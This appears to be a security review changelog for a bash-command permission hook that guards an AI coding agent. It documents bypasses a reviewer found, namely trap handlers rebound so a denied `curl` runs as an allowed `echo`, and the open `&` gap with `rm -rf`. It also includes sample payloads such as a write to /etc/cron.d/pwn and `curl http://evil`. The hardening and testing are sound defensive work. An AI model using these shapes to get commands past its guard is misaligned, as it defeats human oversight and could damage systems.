#### MEDIUM (round-4 review) — probe safety is now a property enforced, not observed

`test_integration_pretool.py`. The reviewer defeated the property test's probe
with `exit 0`, `set -e` + `false`, `trap … DEBUG`, `trap … ERR; false`,
`kill -TERM $$` and `eval 'exit 0'` — each fires a handler *before* the probe
reaches its `trap - …` line. Today's corpus contains none of them, so it was safe
as shipped and nothing enforced that. Now:

- `_FORBIDDEN_IN_CORPUS` gains `exit`, `set`, `DEBUG`, `ERR`, `RETURN`
  (`kill`, `eval`, `exec` were already there).
- `_TRAP_SAFE_SIGSPECS` pins the signals the generator may use, and the new
  `test_corpus_signals_cannot_fire_during_the_probe` asserts every sigspec is in
  it, that each is also cleared by the probe, that `DEBUG`/`ERR`/`RETURN` are
  *not* in it, and that no corpus command names one.
- **7 of the 240 corpus cases carry `printf ok > /etc/cron.d/pwn` inside handler
  quotes.** Harmless while rule 1 holds — which is precisely why rule 1 now has
  structure behind it instead of a promise. Noted in the test's comment.

#### LOW (round-4 review) — `stdin` on the probe

`_bash_registered_handlers` now runs bash with `stdin=subprocess.DEVNULL`. A
corpus case containing `read` would otherwise hang for the full 30 s timeout and
eat the test runner's stdin on the way.

#### LOW (round-4 review) — the decoy false ask is NOT moot

Re-measured under the new rule; it survives, and it is not specific to
double-quoted handlers:

```
printf '%s' 'echo a\necho b' > /dev/null; trap 'echo a echo b' EXIT   -> ask
printf '%s' 'echo a\necho b' > /dev/null; trap "echo a echo b" EXIT   -> ask
trap 'echo a echo b' EXIT                                            -> allow  (control)
```

`_matching_raw_handler_tokens` returns every token that collapses to the handler,
and two candidates means "cannot prove which" means ask. That is round 2's
MEDIUM fix working as designed — the alternative was picking one and producing a
false **deny**, which hard-blocks with no human rescue. Recorded, not changed: a
needless prompt on a contrived shape is the cheap side of that trade.

#### The property test's structural blind spot

Worth stating plainly, because it explains why the property test was green
through all six bypasses. Its oracle for *which handler bash registers* is real
bash and that half is exact. Its oracle for *what that handler means at fire
time* re-derives the binding environment **with the same validator under test**
(the harness prepends the generator's assignments and lets last-write-wins
resolve them). So it was blind to the rebind class **by construction, not by
corpus gap** — no amount of extra cases would have found it. Under the new rule
that class is closed by the rule rather than by the oracle, which is the point of
choosing a rule over a list.

#### Tests — watched to fail first

Written against the fix, then measured against a `/tmp` mirror of the round-4
hook (`cp -a` of `.claude/hooks`; **the repo tree was never reverted** — round
2's `git checkout` accident is a standing rule). Every fixture is built through
`SettingsLoader.load_all_settings()` over a temp workspace with a temp `HOME`,
and asserted to have reached `allowed_patterns`/`denied_patterns` before use.

`allow: ['Bash(echo:*)','Bash(printf:*)']`, `deny: ['Bash(curl:*)']`:

```
                                                                   round 4   round 5
X=echo; trap '$X http://e/x' EXIT; X=curl                          ask       ask
X=echo; trap '$X http://e/x' EXIT; export X=curl                   ALLOW     ask
X=echo; trap '$X http://e/x' EXIT; declare X=curl                  ALLOW     ask
X=echo; trap '$X http://e/x' EXIT; read X <<< curl                 ALLOW     ask
X=echo; trap '$X http://e/x' EXIT; printf -v X curl                ALLOW     ask
X=echo; trap '$X http://e/x' EXIT; for X in curl; do :; done       ALLOW     ask
X=echo; trap '$X http://e/x' EXIT; f(){ X=curl; }; f               ALLOW     ask
X=echo; export X=curl;  trap "$X http://e/x" EXIT                  ALLOW     ask
X=echo; declare X=curl; trap "$X http://e/x" EXIT                  ALLOW     ask
export X=curl; trap "$X http://e/x" EXIT                           ask       ask   (control)
T=trap; X=echo; $T "$X http://e/x" EXIT; export X=curl             ALLOW     ask
X=/tmp/a; trap 'curl http://evil; echo $X' EXIT; X=/tmp/b          ask       deny  (MEDIUM)
X=curl; trap "echo a\n$X http://e/x" EXIT; X=echo                  deny      ask   (no false deny)
```

New tests, all in `TestSafeBuiltinsTierOrdering`:

- `test_trap_handler_rebound_by_a_non_standalone_assignment_asks` — the six
  spellings plus the one round 4 caught, as the control.
- `test_trap_double_quoted_handler_shadowed_by_an_earlier_rebind_asks` — four
  earlier-rebind forms plus the "nothing resolvable" control.
- `test_trap_double_quoted_handler_asks_on_a_bare_constant_too` — no rebind at
  all, either regime: the rule does not depend on one.
- `test_trap_rebinding_some_other_name_asks_too` — replaces round 4's
  narrowness test, whose premise the rule discards.
- `test_trap_assembled_by_expansion_asks` — the `$T` command-word case.
- `test_trap_handler_provable_deny_survives_the_rule` — the MEDIUM, both
  directions (deny stands; a deny may not be manufactured by an expansion).
- `test_trap_handlers_without_an_expansion_are_untouched` — the controls, in one
  place: task 25's motivating command, `trap 'echo hi' EXIT` in both regimes, the
  function-handler shape, multi-line all-allowed handlers, the blank-line and
  indented spellings, a `/tmp` handler redirect, a `$` in the *sigspec* only,
  `trap - EXIT` / `trap '' SIGINT` / `trap -p SIGTERM` / `trap -l` / `trap` /
  `trap --`, plus the deny-inheritance and handler-redirect gates.
- `test_trap_prompt_shows_the_text_that_was_written` — see below.
- `test_corpus_signals_cannot_fire_during_the_probe` — the probe-safety MEDIUM.

Existing tests changed, honestly rather than deleted:

| test | what happened |
|---|---|
| `test_trap_single_quoted_handler_without_a_later_binding_still_resolves` | **replaced** by `test_trap_double_quoted_handler_asks_on_a_bare_constant_too` — its premise ("no later binding, so the constant resolves") is exactly what the rule refuses. All four of its shapes now ask, and are asserted to. |
| `test_trap_double_quoted_handler_still_expands_at_registration` | **replaced** by the same test — the "control that keeps the fix from over-applying" was itself the double-quoted bypass. |
| `test_trap_deferred_binding_only_fires_for_the_name_the_handler_uses` | **replaced** by `test_trap_rebinding_some_other_name_asks_too` (allow → ask). |
| `test_handler_binding_is_deferred_unit` | **deleted** with the predicate. |
| `test_trap_constant_handler_of_a_multiline_command_is_not_blanket_asked` | **renamed** `…_asks`: `X=/tmp/x\ntrap "rm -f $X" EXIT` now prompts, and the test states the migration (spell the path inside the handler) and asserts it keeps the allow. |
| `test_trap_newline_handler_constant_expansion_does_not_allow` | rows now carry a **per-row verdict**: four keep `deny` (the denied command word is a literal), the fifth — `C=curl; trap 'echo a\n$C …' EXIT` — moves to `ask`, because what `$C` holds at fire time is exactly what is not known. |
| `test_trap_unresolvable_constant_in_a_newline_handler_still_asks` | **renamed** `…_denies`: `curl $UNKNOWN` names `curl` outright, so the deny is provable however `$UNKNOWN` expands. The test also pins the counterpart — with `curl` allowed, the same command asks, so the `$` is demonstrably the only thing stopping the allow. |
| `test_trap_single_quoted_handler_with_a_later_binding_does_not_allow` / `…does_not_deny` / `…asks_in_every_spelling` | unchanged and still green; their docstrings now say which round found what. |

`_TASK_31_KNOWN_FAILING` and the property test are untouched, and the list is
still exact in both directions (8 entries, all `&` shapes).

#### Suite

```
python3 tests/run_all_tests.py
Ran 1376 tests in 33.4s
OK (skipped=1)
```

1,371 → 1,376. Nine test methods added (eight in `TestSafeBuiltinsTierOrdering`,
one in `TestTrapHandlerAgainstRealBash`), four removed — `…_deferred_binding_unit`
deleted with its predicate, and three replaced by tests of the new rule. Two more
were renamed in place to match the verdict they now assert.

#### Differential sweep — 74,188 evaluations, zero loosening toward allow

18,547 distinct commands × 4 settings profiles, round-4 hook vs round-5 hook, run
out of `/tmp` copies. Corpus: 23 handler bodies (literal, newline, pipe, `&&`,
`||`, `&`, redirect-to-`/tmp`, redirect-to-`/etc`, blank+indent, `$V` as command
word / argument / braced / unknown, a literal-deny-plus-`$V` shape, nested traps
in both regimes, `$(…)`, backticks, `$HANDLER`) × 2 quoting regimes × 7 sigspecs
(incl. `$S`) × 5 constant prefixes × 9 assignment tails covering **all seven
rebind spellings** × 7 earlier-rebind prefixes × 7 surrounding contexts (incl.
the decoy and `&`), plus 25 general non-trap commands. Profiles: `deny-curl`,
`no-deny`, `deny-echo`, `ask-git`.

```
rows                                   74188
changed                                 3404
  allow -> ask                          2312   the `$` rule closing the class
  ask   -> deny                           756   the MEDIUM: provable denies restored
  deny  -> ask                            336   expansion-manufactured denies withdrawn
transitions ENDING at allow                 0
errors / exceptions                         0
```

- **Not one transition ends at `allow`.** Verified twice (two independent runs
  byte-identical).
- **The two deny-direction classes are clean, not mixed.** 336/336 of the
  withdrawn denies have no literal denied command word in the raw handler;
  756/756 of the restored denies have one. Checked by re-extracting the handler
  from each command and matching the profile's denied word at a command position
   — not by eyeballing samples, which is how rounds 3 and 4 got this wrong twice.

#### Property corpus — how much moved

The 240-case corpus was **not trimmed**; nothing about the generator changed.
Its cases carry no hard-coded expected verdict (the property is
`verdict(command) == verdict(registered handler) or 'ask'`), so there was nothing
to "update" — but the verdicts did move, and here is the honest count:

```
moved: 42 of 240      allow -> ask  31      deny -> ask  11      toward allow  0
distribution   before:  allow 66  deny 105  ask 69
distribution   after:   allow 35  deny  94  ask 111
```

#### The prompt now shows what was written, not what was guessed

Found while testing the fix end to end through the hook's stdin interface, and
fixed in the same pass because the rule makes it dangerous. Every trap verdict
used to be reported against the EXPANDED sub-command:

```
X=echo; trap "$X http://e/x" EXIT; export X=curl
    before:  ask — "Not in allowlist … : `trap 'echo http://e/x' EXIT`"
    after:   ask — "Not in allowlist … : `trap \"$X http://e/x\" EXIT`"
```

The old prompt showed the operator a harmless-looking `echo` and asked them to
approve it — when the entire reason for the prompt is that `echo` is a value this
validator guessed and bash may register something else. Pre-existing (round 4
prompted the same way on `trap_handler_deferred_binding`), but the rule makes it
2,312× more common, so `_trap_handler_verdict` now reports every verdict — ask
and deny alike — against `written`, the pre-expansion source. Pinned by
`test_trap_prompt_shows_the_text_that_was_written`.

#### One behaviour change worth flagging

A `trap` whose handler is built by a **denied** generator now denies instead of
asking:

```
deny: ['Bash(cat:*)']
trap '$(cat payload)' EXIT             round 4: ask     round 5: deny
trap 'echo x; $(cat payload)' EXIT     round 4: ask     round 5: deny
```

**Corrected after the round-5 review (the original entry named the wrong
spelling).** This bullet first cited the *double-quoted* `trap "$(cat payload)"
EXIT`, which was **already `deny` in round 4** — a double-quoted `$( )` is
extracted as a sibling top-level sub-command, so `cat payload` denies
independently of the trap path and nothing about it changed. The spelling that
actually moved is the **single-quoted** one, where the substitution is hidden
from top-level extraction and only the handler path ever sees it.

The behaviour is correct on both sides of the ledger either way: `cat payload`
genuinely runs in this shell — at *fire* time for the single-quoted form, at
registration for the double-quoted — and deny is final. `trap '$(echo hi)' EXIT`
(allowed generator) still asks, because validating the generator is not
validating the handler.

Recording the correction rather than quietly editing the claim: picking an
illustration that did not actually change is the same species of error as the
two round-3/round-4 overclaims struck above, and it survived until a reviewer
measured it.

#### Residual risk (round 5)

1. **Still not installed.** `~/.claude/hooks/pretool_hook.py` remains a pre-fix
   copy; `./install-claude-config.sh` must run before any of this is live.
2. **More prompts, deliberately.** Any handler carrying a `$` or a backtick now
   asks, including shapes that were provably fine —
   `X=/tmp/x; trap "rm -f $X" EXIT` is the common one. The cure is to spell the
   value inside the handler (`trap 'rm -f /tmp/x' EXIT`, still `allow`) or add a
   narrow allowlist entry, **not** to reintroduce a resolver. 2,312 sweep rows
   and 31 corpus cases moved this way; none of them moved toward `allow`.
3. **Assignments *inside* the handler are still not modelled** — and no longer
   need to be for the `$` case (`X=echo; trap 'X=curl; $X …' EXIT` asks on the
   `$`). A handler that rebinds a name and then calls a *function* whose body was
   validated separately is still outside the model.
4. **Defect (b) remains narrowed by task 31**, unchanged: while `&` is not a
   separator, `trap 'echo ok & rm -rf …' EXIT` allows because the parser hands
   back one sub-command headed `echo`. The property test carries the eight known
   failures and retires them itself.
5. **The decoy false ask** (LOW above) — recorded, not changed.
6. **Recovery still depends on `raw_command` being threaded** (round 2 item 2).
   One fewer argument to forget than round 4 had, but the dependency stands:
   `validate_bash_command` is the only production entry point and passes it.
7. **`unexpanded_cmd` is the new thread that must not be dropped.** A caller that
   omits it makes `_trap_handler_verdict` fall back to the expanded `cmd`, which
   would silently restore the round-4 behaviour for constants. It is passed at the
   two call sites that exist (`validate_bash_command` and the nested-handler
   recursion), and every rebind test above would fail loudly if it were dropped.
8. **All three workspace shortcuts still outrank deny** — task 30. Round 1's
   residual items **1, 2, 3, 5, 7, 8**, round 2's **1, 2, 3**, round 3's
   **1, 2, 3, 4, 5** and round 4's **1, 2, 3, 4, 5** otherwise stand as written,
   except round 4's **6** and **7**, which this round supersedes.
